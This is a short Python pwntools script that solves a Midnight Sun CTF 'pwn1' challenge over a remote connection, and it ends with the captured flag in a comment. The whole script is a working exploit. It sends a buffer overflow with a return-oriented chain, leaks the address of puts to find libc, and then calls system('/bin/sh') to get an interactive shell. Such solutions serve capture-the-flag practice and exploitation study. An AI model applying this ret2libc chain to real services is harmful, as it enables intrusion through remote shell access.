from pwn import *

context.binary = elf = ELF('./pwn1')
libc = ELF('./libc.so')
p = remote("pwn1-01.play.midnightsunctf.se", 10001)
# p = process('./pwn1')
# gdb.attach(p, 'init-peda')
main = 0x400698
pop_rdi = 0x0000000000400783
payload = "A"*0x48
payload += p64(pop_rdi) +p64(elf.got['puts'])+ p64(elf.plt['puts']) + p64(main)
p.sendlineafter("buffer: ", payload)

leak = u64(p.recvline(False).ljust(8,'\x00'))
# print hex(leak)
libc.address = leak - libc.symbols['puts']
payload = "A"*0x48+p64(pop_rdi)+ p64(libc.search('/bin/sh').next()) + p64(0x0000000000400536) + p64(libc.symbols['system'])
p.sendlineafter("buffer: ", payload)
p.interactive()
# midnight{the_pwnshank_redemption_d2b4205bea4b8eeb}